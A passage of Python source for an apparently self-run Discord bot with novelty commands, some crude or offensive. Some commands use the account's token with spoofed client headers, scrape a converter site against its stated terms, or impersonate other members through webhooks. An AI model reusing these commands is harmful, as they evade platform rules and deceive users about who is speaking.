        hex_text = hex_text.lstrip('0x')
        decoded_text = bytes.fromhex(hex_text).decode('utf-8')
        await ctx.send(decoded_text)
    except:
        heading = "De-Hex"
        body = "Invalid hexadecimal input."
        cmdname = "dehex"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Puts an emoji in place of spaces. \nUsage: {config_get('prefix')}emojispace <emoji> <text>", help="fun") 
async def emojispace(ctx, emoji, *, text):    
    emojified_text = emoji.join(text.split())
    await ctx.send(emojified_text)

@Cheddlatron.command(description=f"Translates text to binary. \nUsage: {config_get('prefix')}binary <text>", help="fun") 
async def binary(ctx, *, text):    
    binary_text = ' '.join(format(ord(char), '08b') for char in text)    
    await ctx.send(binary_text)

@Cheddlatron.command(description=f"Translates binary to text. \nUsage: {config_get('prefix')}debinary <binary>", help="fun") 
async def debinary(ctx, *, binary_text):    
    binary_chunks = binary_text.split()   
    try:
        decoded_text = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)   
        await ctx.send(decoded_text)
    except ValueError:
        heading = "De-Binary"
        body = "Invalid binary input."
        cmdname = "debinary"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(name="base64", description=f"Translates text to base64. \nUsage: {config_get('prefix')}base64 <text>", help="fun") 
async def b64(ctx, *, text):    
    encoded_text = base64.b64encode(text.encode('utf-8')).decode('utf-8')   
    await ctx.send(encoded_text)

@Cheddlatron.command(description=f"Translates base64 to text. \nUsage: {config_get('prefix')}debase64 <base64>", help="fun") 
async def debase64(ctx, *, base64_text):    
    try:
        decoded_text = base64.b64decode(base64_text).decode('utf-8')   
        await ctx.send(decoded_text)
    except:
        heading = "De-Base64"
        body = "Invalid base64 input."
        cmdname = "debase64"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Flips a coin and returns heads or tails. \nUsage: {config_get('prefix')}coinflip", help="fun")
async def coinflip(ctx):    
    coin = randint(1, 2)
    heading = "Coin Flip"
    cmdname = "coinflip"
    if coin == 1:
        body = "Heads"
    elif coin == 2:
        body = "Tails"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a wave of text. \nUsage: {config_get('prefix')}wave <text>", help="fun")
async def wave(ctx, *, sentence):
    spaces = 0
    string = ''
    max_length = 1500
    for _ in range(9):  
        for _ in range(5):
            string += f'{" " * spaces}{sentence}\n'
            spaces += 1
            if len(string) >= max_length:
                await ctx.send(string)
                string = ''
        for _ in range(5):
            spaces -= 1
            if spaces >= 0:
                string += f'{" " * spaces}{sentence}\n'
                if len(string) >= max_length:
                    await ctx.send(string)
                    string = ''
    if string:
        await ctx.send(string)

@Cheddlatron.command(description=f"Sends a random Netflix movie/series with details. \nUsage: {config_get('prefix')}randomnetflix", help="fun")
async def randomnetflix(ctx):    
    r = requesters.get(f'https://api.reelgood.com/v3.0/content/random?availability=onAnySource&content_kind=both&nocache=true&region=de&sources=netflix')
    jss = json.loads(r.text)
    title = jss['title']
    overview = jss['overview']
    releasedate = jss['released_on']
    releasedate = releasedate.split('T')[0]
    releasedate = releasedate.split('-')
    year = releasedate[0]
    month = releasedate[1]
    day = releasedate[2]
    tagline = jss['tagline']
    yozaid = jss['id']
    if tagline == '':
        tagline = 'No tagline for this movie ):'
    else:
        pass
    heading = "Random Netflix"
    body = f"Title: {title}\nTagline: {tagline}\nDescription: {overview}\nRelease Date: {day}\\{month}\\{year}"
    cmdname = "randommovie"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(aliases=['atv'], description=f"Converts audio into a voice message. \nUsage: {config_get('prefix')}audiotovoice <link/attached audio>", help="fun")             
async def audiotovoice(ctx, *, filepath_url = None):
    async def convtoopus(file):
        json_data = {
            'targetformat': 'opus',
            'audiobitratetype': '0',
            'customaudiobitrate': '',
            'audiosamplingtype': '0',
            'customaudiosampling': '',
            'code': '82000',
            'oAuthToken': '',
            'legal': 'Our PHP programs can only be used in aconvert.com. We DO NOT allow using our PHP programs in any third-party websites, software or apps. We will report abuse to your cloud provider, Google Play and App store if illegal usage found!'
        }

        files=[
        ('file',('4883.MP4',file,'application/octet-stream'))
        ]

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Origin': 'https://www.aconvert.com',
            'Referer': 'https://www.aconvert.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        e = requested.post("https://s31.aconvert.com/convert/convert9.php", data=json_data, headers=headers, files=files).json()
        server = e['server']
        filename = e['filename']
        opus = requested.get(f"https://s{server}.aconvert.com/convert/p3r68-cdx67/{filename}")
        return opus.content

    try:
        file_url = None
        filepath = None
        if not filepath_url:
            if ctx.message.attachments:
                file_url = ctx.message.attachments[0].url
            else:
                header = "Error"
                body = "No attachment or URL provided."
                cmdname = "ERROR"
                await panelmaker(ctx, heading=header, body=body, cmdname=cmdname)
                return
        elif filepath_url.startswith('https://'):
            file_url = filepath_url
        else:
            filepath = filepath_url
        
        file_content = None
        if file_url:
            response = requesters.get(file_url)
            if response.status_code == 200:
                file_content = response.content
            else:
                header = "Error"
                body = "Failed to fetch the file from the URL.\nTry uploading file normally and using the link."
                cmdname = "ERROR"
                await panelmaker(ctx, heading=header, body=body, cmdname=cmdname)
                return
        elif filepath:
            with open(filepath, 'rb') as file:
                file_content = file.read()
        
        voicefile = await convtoopus(file_content)
        filesize = len(voicefile)
        
        headers = {
            "Content-Length": str(filesize),
            "User-Agent": "Discord/42954 CFNetwork/1390 Darwin/22.0.0",
            "Authorization": config_get('token'),
            "x-debug-options": "bugReporterEnabled",
            "Accept-Language": "en-NZ",
            "x-discord-locale": "en-US",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "x-super-properties": getxsuper()
        }

        rbody = {
            "files": [{"file_size": filesize, "filename": "voice-message.ogg", "id": "69"}]
        }
        firstreq = requested.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/attachments', headers=headers, json=rbody)
        firstreq_data = firstreq.json()
        
        uploadname = firstreq_data['attachments'][0]["upload_filename"]
        uploadurl = firstreq_data['attachments'][0]["upload_url"]
        print(uploadurl)
        
        upload_headers = {
            "Host": "discord-attachments-uploads-prd.storage.googleapis.com",
            "Accept-Language": "en-NZ,en-AU;q=0.9,en;q=0.8",
            "User-Agent": "Discord/42954 CFNetwork/1390 Darwin/22.0.0",
            "Content-Type": "audio/ogg",
            "Connection": "keep-alive",
            "Content-Length": str(filesize)
        }
        
        upload_response = requested.put(uploadurl, data=voicefile, headers=upload_headers)
        
        msgdata = {
            "channel_id": ctx.channel.id,
            "flags": 8192,
            "content": "",
            "nonce": "",
            "type": 0,
            "attachments": [{
                "id": "0",
                "filename": "voice-message.ogg",
                "uploaded_filename": uploadname,
                "duration_secs": 0,
                "waveform": ""
            }]
        }
        final_response = requested.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headers, json=msgdata)
    except Exception as e:
        print(e)
        

@Cheddlatron.command(description=f"Creates an among us emergency meeting screen. \nUsage: {config_get('prefix')}emergencymeeting <text>", help="fun")
async def emergencymeeting(ctx, *, text):    
    await apiimg(ctx,(urlify(f"https://vacefron.nl/api/emergencymeeting?text={text}")))

@Cheddlatron.command(description=f"Creates an among us ejected screen. \nUsage: {config_get('prefix')}ejected <name>", help="fun")
async def ejected(ctx, *, name):    
    a = ["true", "false"]
    b = ["black", "blue", "brown", "cyan", "darkgreen", "lime", "orange", "pink", "purple", "red", "white", "yellow"]
    imposter = random.choice(a)
    colour = random.choice(b)
    if colour == "red":
        imposter = "true"
    url = f'https://vacefron.nl/api/ejected?name={name}&impostor={imposter}&crewmate={colour}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Widens a user's pfp. \nUsage: {config_get('prefix')}wide <@user>", help="fun")
async def wide(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author
    av = user.avatar.replace(format="png", size=1024)
    url = f"https://vacefron.nl/api/wide?image={av}"
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Creates a wanted poster. \nUsage: {config_get('prefix')}wanted <@user>", help="fun")
async def wanted(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author
    av = user.avatar.replace(format="png", size=1024)
    url = f'https://api.popcat.xyz/wanted?image={av}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Makes a user's pfp hold the chat at gun-point. \nUsage: {config_get('prefix')}gunpoint <@user>", help="fun")
async def gunpoint(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author
    av = user.avatar.replace(format="png", size=1024)
    url = f'https://api.popcat.xyz/gun?image={av}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Makes a fake iPhone emergency alert notification. \nUsage: {config_get('prefix')}iphonealert <text>", help="fun")
async def iphonealert(ctx, *, msg):    
    url = f'https://api.popcat.xyz/alert?text={msg}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Makes someone's pfp drippy. \nUsage: {config_get('prefix')}drippy <@user>", help="fun")
async def drippy(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author
    av = user.avatar.replace(format="png", size=1024)
    url = f'https://api.popcat.xyz/drip?image={av}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Makes a who would win table. \nUsage: {config_get('prefix')}whowouldwin <@user1> <@user2>", help="fun")
async def whowouldwin(ctx, user1: discord.User, user2: discord.User):   
    av1 = user1.avatar.replace(format="png", size=1024)
    av2 = user2.avatar.replace(format="png", size=1024)
    url = f'https://api.popcat.xyz/whowouldwin?image2={av2}&image1={av1}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Determines how gay someone is. \nUsage: {config_get('prefix')}gayrate <@user>", help="fun")
async def gayrate(ctx, member: discord.User=None):    
    if member is None:
        member = ctx.message.author
    percent = randint(1,100)
    await ctx.send(f"```{member} is {percent}% gay```")

@Cheddlatron.command(description=f"Determines if someone is lying or not. \nUsage: {config_get('prefix')}liedetector <@user>", help="fun")
async def liedetector(ctx, member: discord.User=None):    
    if member is None:
        member = ctx.message.author
    choice = ["is", "is not"]
    choi = random.choice(choice)
    await ctx.send(f"```{member} {choi} lying```")

@Cheddlatron.command(description=f"Sends a random and useless fact. \nUsage: {config_get('prefix')}uselessfact", help="fun")
async def uselessfact(ctx):    
    r = requesters.get('https://uselessfacts.jsph.pl/random.json?language=en')
    r = r.json()
    fact = r['text']
    heading = "Useless Fact"
    body = fact
    cmdname = "uselessfact"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Shows information on a pokemon. \nUsage: {config_get('prefix')}pokedex <pokemon>", help="fun")
async def pokedex(ctx, pokemon):    
    poke = urllib.parse.quote(pokemon)
    r = requesters.get(f'https://pokeapi.co/api/v2/pokemon/{poke.lower()}')
    r = r.json()
    poke = r['name']
    dex = r['id']
    type = r['types'][0]["type"]["name"]
    hp = r["stats"][0]["base_stat"]
    att = r["stats"][1]["base_stat"]
    deff = r["stats"][2]["base_stat"]
    spatk = r["stats"][3]["base_stat"]
    spdef = r["stats"][4]["base_stat"]
    spd = r["stats"][5]["base_stat"]
    heading = f"Pokedex Entry of {poke}"
    body = f"ID: {dex}\nType: {type}\nHealth: {hp}\nAttack: {att}\nDefense: {deff}\nSpAttack: {spatk}\nSpDefnse: {spdef}\nSpeed: {spd}"
    cmdname = "pokedex"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Overlays the gay flag on someone's pfp. \nUsage: {config_get('prefix')}gayoverlay <@user>", help="fun")
async def gayoverlay(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    url = f'https://some-random-api.com/canvas/gay?avatar={user.avatar.replace(format="png")}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Creates a horny license. \nUsage: {config_get('prefix')}hornycard <@user>", help="fun")
async def hornycard(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author          
    url = f'https://some-random-api.com/canvas/horny?avatar={user.avatar.replace(format="png")}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Creates a simp card. \nUsage: {config_get('prefix')}simpcard <@user>", help="fun")
async def simpcard(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author    
    url = f'https://some-random-api.com/canvas/simpcard?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Says a random insult to a user. \nUsage: {config_get('prefix')}insult <@user>", help="fun")
async def insult(ctx, user: discord.User=None):
    if user == None:
        user = ctx.message.author   
    insult = requesters.get("https://insult.mattbas.org/api/insult").text
    await ctx.send(f"<@{user.id}>, {insult}")

@Cheddlatron.command(description=f"Sends a custom Minecraft achievement. \nUsage: {config_get('prefix')}mcachievement <title> <text>", help="fun") 
async def mcachievement(ctx, title: str, text: str):   
    url = urlify(f"https://skinmc.net/achievement/1/{title}/{text}")
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Sends a random quote from Kanye West. \nUsage: {config_get('prefix')}kanyequote", help="fun")
async def kanyequote(ctx):    
    r = requesters.get('https://api.kanye.rest/')
    r = r.json()
    quote = r['quote']
    heading = "Kanye Quote"
    body = quote
    cmdname = "kanyequote"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Flips text upside down. \nUsage:{config_get('prefix')}flip <text>", help="fun")
async def flip(ctx, *, message):    
    char_list = "!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}"
    alt_char_list = "{|}zʎxʍʌnʇsɹbdouɯlʞɾᴉɥƃɟǝpɔqɐ,‾^[\]Z⅄XMΛ∩┴SɹQԀONW˥ʞſIHפℲƎpƆq∀@¿<=>;:68ㄥ9ϛㄣƐᄅƖ0/˙-'+*(),⅋%$#¡"[::-1]
    text_flip = dict(zip(char_list + alt_char_list, alt_char_list + char_list))
    result = "".join(text_flip.get(char, char) for char in message[::-1])
    await ctx.send(result)

@Cheddlatron.command(description=f"Impersonates someone using webhooks. \nUsage:{config_get('prefix')}impersonate <@user> <text>", help="fun")
async def impersonate(ctx, member: discord.Member, *, message):
    avatar = member.avatar.replace(format='png', size=256)
    pfp = requesters.get(avatar).content
    hook = await ctx.channel.create_webhook(name=member.display_name, avatar=pfp)
    await hook.send(message)
    await hook.delete()

@Cheddlatron.command(description=f"Displays a random number of a dice (numbers 1-6). \nUsage: {config_get('prefix')}dice", help="fun")
async def dice(ctx):    
    heading = "Dice Roll"
    body = f"You rolled a {random.randrange(1, 6)}!"
    cmdname = "dice"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a stickbug meme from someone's pfp. \nUsage: {config_get('prefix')}stickbug <@user>", help="fun")
async def stickbug(ctx, user: discord.User = None):    
    user = user or ctx.author
    url = requesters.get(f"https://nekobot.xyz/api/imagegen?type=stickbug&url={str(user.avatar).replace('', 'png')}").json()['message']
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            image_data = io.BytesIO(await response.read())
            await ctx.send(file=discord.File(image_data, f'Cheddlatron_Stickbug.mp4'))

@Cheddlatron.command(description=f"Displays a user's dick size. \nUsage: {config_get('prefix')}dick <@user>", help="fun")
async def dick(ctx, *, user: discord.User = None): 
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    heading = f"{user.name}'s Dick Size"
    body = f"8{dong}D"
    cmdname = "dick"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays a cum animation. \nUsage: {config_get('prefix')}cum", help="fun")
async def cum(ctx):   
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
             ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    
@Cheddlatron.command(description=f"Displays a 9/11 animation. \nUsage: {config_get('prefix')}nineeleven", help="fun")
async def nineeleven(ctx):   
    nineleven = await ctx.send(":airplane:** ** ** ** ** ** ** **:office::office:")
    await asyncio.sleep(1)
    await nineleven.edit(content=":airplane:** ** ** ** ** **:office::office:")
    await asyncio.sleep(1)
    await nineleven.edit(content=":airplane:** ** ** **:office::office:")
    await asyncio.sleep(1)
    await nineleven.edit(content=":airplane:** **:office::office:")
    await asyncio.sleep(1)
    await nineleven.edit(content=":airplane::office::office:")
    await asyncio.sleep(1)
    await nineleven.edit(content=":fire::fire::fire:")

@Cheddlatron.command(name='8ball', description=f"Answers a question like a magic 8ball. \nUsage: {config_get('prefix')}8ball <question>", help="fun")
async def _ball(ctx, *, question):    
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance',
        'Yes.'
    ]
    answer = random.choice(responses)
    heading = "Magic 8 Ball"
    body = f"Question: {question}\nAnswer: {answer}"
    cmdname = "8ball"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays a tweet as if you were another discord user. \nUsage: {config_get('prefix')}tweet @user (text)", help="fun")
async def tweet(ctx, username: str, *, message: str):     
    url = f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}"
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Combines 2 words. \nUsage: {config_get('prefix')}combine <word1> <word2>", help="fun")
async def combine(ctx, name1, name2):     
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])   
    heading = "Combine"
    body = f"{name1}+{name2}\n\n{ship}"
    cmdname = "combine"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a lenny face. \nUsage: {config_get('prefix')}lenny", help="fun")
async def lenny(ctx):    
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@Cheddlatron.command(aliases=['wouldyourather'], description=f"Displays a would you rather question. \nUsage: {config_get('prefix')}wyr", help="fun")
async def wyr(ctx):    
    r = requesters.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    heading = "Would You Rather"
    body = f"{qa}\n{qor}\n{qb}"
    cmdname = "wyr"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"sends a random topic. \nUsage: {config_get('prefix')}topic", help="fun")
async def topic(ctx):     
    r = requesters.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    heading = "Random Topic"
    body = topic
    cmdname = "topic"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a random dad joke. \nUsage: {config_get('prefix')}joke", help="fun")
async def joke(ctx):     
    headers = {"Accept": "application/json"}
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    heading = "Dad Joke"
    body = r['joke']
    cmdname = "joke"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a random dark joke. \nUsage: {config_get('prefix')}darkjoke", help="fun")
async def darkjoke(ctx):      
    headers = {"Accept": "application/json"}
    async with aiohttp.ClientSession() as session:
        async with session.get("https://v2.jokeapi.dev/joke/Dark", headers=headers) as req:
            r = await req.json()
    if 'setup' in r:
        heading = "Dark Joke"
        body = f"{r['setup']}\n{r['delivery']}"
        cmdname = "darkjoke"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "Dark Joke"
        body = f"{r['joke']}"
        cmdname = "darkjoke"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays a virus animation. \nUsage: {config_get('prefix')}virus", help="fun")
async def virus(ctx):    
    virus = await ctx.send("``[▓▓▓                    ] / Ched-virus.exe Packing files.``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓                ] - Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \\ Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \\ Ched-virus.exe Packing files..``")
    await asyncio.sleep(1)
    await virus.edit(content="``Successfully downloaded Ched-virus.exe``")
    await asyncio.sleep(1)
    await virus.edit(content="``Injecting virus.   |``")
    await asyncio.sleep(1)
    await virus.edit(content="``Injecting virus..  /``")
    await asyncio.sleep(1)
    await virus.edit(content="``Injecting virus... -``")
    await asyncio.sleep(1)
    await virus.edit(content=f"``Successfully Injected Ched-virus.exe into {Cheddlatron.user.name}``")
    await asyncio.sleep(1)
    await virus.edit(content=f"``Goodbye {Cheddlatron.user.name}``")
    await asyncio.sleep(1)
    subprocess.run(["taskkill", "/f", "/im", "Discord.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)


@Cheddlatron.command(description=f"Makes a user's pfp funky. \nUsage: {config_get('prefix')}magik <@user>", help="fun")
async def magik(ctx, user: discord.User = None):    
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        user = ctx.message.author
    avatar = str(user.avatar.replace(format="png"))
    endpoint += avatar
    r = requesters.get(endpoint)
    res = r.json()
    await apiimg(ctx, res["message"])

@Cheddlatron.command(description=f"Makes a user's pfp deepfried. \nUsage: {config_get('prefix')}fry <@user>", help="fun")
async def fry(ctx, user: discord.User = None):    
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        user = ctx.message.author
    avatar = str(user.avatar.replace(format="png"))
    endpoint += avatar
    r = requesters.get(endpoint)
    res = r.json()
    await apiimg(ctx, res["message"])

@Cheddlatron.command(description=f"Changes the colors of a user's pfp. \nUsage: {config_get('prefix')}blurpify <@user>", help="fun")
async def blurpify(ctx, user: discord.User = None):    
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        user = ctx.message.author
    avatar = str(user.avatar.replace(format="png"))
    endpoint += avatar
    r = requesters.get(endpoint)
    res = r.json()
    await apiimg(ctx, res["message"])

@Cheddlatron.command(description=f"Creates a custom hub comment. \nUsage: {config_get('prefix')}phc [@user] <text>", help="fun")
async def phc(ctx, user: discord.User=None, *, args=None):    
    if user == None:
        user = ctx.message.author
    elif args == None:
        args = "You forgot to put a comment dummy"
    args = urlify(args)
    pfp = user.avatar.replace(format="png", size=1024)
    endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={pfp}"
    r = requesters.get(endpoint)
    res = r.json()
    await apiimg(ctx, res["message"])

@Cheddlatron.command(description=f"Sends a photo of a dog. \nUsage: {config_get('prefix')}dog", help="fun")
async def dog(ctx):    
    r = requesters.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    await apiimg(ctx, link)

@Cheddlatron.command(description=f"Sends a photo of a cat. \nUsage: {config_get('prefix')}cat", help="fun")
async def cat(ctx):    
    r = requesters.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    await apiimg(ctx, link)

@Cheddlatron.command(description=f"Sends a game of minesweeper. \nUsage: {config_get('prefix')}minesweeper [number of mines] [gridsize]", help="fun")
async def minesweeper(ctx, mines_number: int = 10, size: int = 5):    
    MINE = ':boom:'
    NUMBERS = [':zero:', ':one:', ':two:', ':three:', ':four:', ':five:', ':six:', ':seven:', ':eight:']
    SPOILER = '||'
    response = ''
    if size <= 0 or size > 12:
        response = "Please Pick a number between 1 and 12"
    else:
        grid = [None] * (size * size)
        for mine in range(mines_number):
            grid[random.randrange(0, len(grid))] = MINE
        for case in range(len(grid)):
            if grid[case] != MINE:
                number = sum(
                    grid[cursor] == MINE
                    for cursor in [
                        case - size - 1, case - size, case - size + 1,
                        case - 1, case + 1,
                        case + size - 1, case + size, case + size + 1
                    ]
                    if 0 <= cursor < len(grid)
                )
                grid[case] = NUMBERS[number]
        for line in range(size):
            line_value = ''.join(f'{SPOILER}{grid[line * size + case]}{SPOILER}' for case in range(size))
            response += f"{line_value}\n"
    await ctx.send(response)

@Cheddlatron.command(description=f"Reverses text. \nUsage: {config_get('prefix')}reverse <text>", help="fun")
async def reverse(ctx, *, message):    
    message = message[::-1]
    await ctx.send(message)

@Cheddlatron.command(description=f"Sends a fuck you emoji. \nUsage: {config_get('prefix')}fuckyou", help="fun")
async def fuckyou(ctx):        
        await ctx.send("╭∩╮(･◡･)╭∩╮")

@Cheddlatron.command(description=f"Encrypts a message. \nUsage: {config_get('prefix')}encrypt <text>", help="fun")
async def encrypt(ctx, *, text):        
        to_morse = {
        ' ': 'ᛝᧀಣಱಣಱᛥಉᛝᥪಣಱಣಱᧀᔑ',
        'a': 'ᥪಣಱᧀ',
        'b': 'ᣠಣಱᢩಣಱ',
        'c': 'ᛥᛝ',
        'd': 'ಉಣಱ',
        'e': 'ᚰಣಱᚸಣಱᚹ',
        'f': 'ᒴᒰ',
        'g': 'ϖ',
        'h': 'ლಣಱქ',
        'i': 'ᔑΩᔑ',
        'j': 'ΩᔑΩ',
        'k': 'ၸၴ',
        'l': 'ၡ',
        'm': 'ႁၡ',
        'n': 'ႰႤ',
        'o': 'ჰწჯ',
        'p': 'ᛠᛩ',
        'q': 'ᛠߐᢂᢂᢂᢂ',
        'r': 'ᛤᛟᛮ',
        's': 'ᖸᗱ',
        't': '⏇⏅⏆',
        'u': 'ϧ⏁⏇',
        'v': '⏂⏁',
        'w': '₶⊡',
        'x': 'ᾣ‿',
        'y': 'ᢆᢂ',
        'z': 'ᣆᣂ',
        '1': '⏂',
        '2': 'ᣆ',
        '3': 'ᢂᢂᢂᢂᢂᢂ',
        '4': '⏅ᢂᢂᢂᢂᢂ',
        '5': 'ᗱᗱEᗱ',
        '6': 'ᢆᗱ⏅',
        '7': 'ϧ⏅ლᗱ',
        '8': '⊡⊡⊡⊡⏅⏅ლ',
        '9': '⏇⏇ߐ',
        '0': 'ႁoႁ',
        ',': 'ϖ⊡',
        '!': 'ၸၴ⊡',
        '.': 'ჯწ',
        '?': 'წ⏇',
        '-': '⏇ϧ⏅',
        '#': '⊡⏅ლ',
        '@': 'ᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂ',
        '*': '42',
        '"': '⏅ლၸၴ⊡ᢂᢂ',
        "'": "ၸၴᢂᢂᢂ"
        }
        output = ""
        text = list(text.lower())
        for letter in text:
            if letter in to_morse:
                output = output + to_morse[letter] + " "
            else:
                output = output + letter
        await ctx.send(output)


@Cheddlatron.command(description=f"Decrypts a message that was encrypted by another Cheddlatron user. \nUsage: {config_get('prefix')}decrypt <encrypted text>", help="fun")
async def decrypt(ctx, *, text):    
    to_morse = {
        ' ': 'ᛝᧀಣಱಣಱᛥಉᛝᥪಣಱಣಱᧀᔑ',
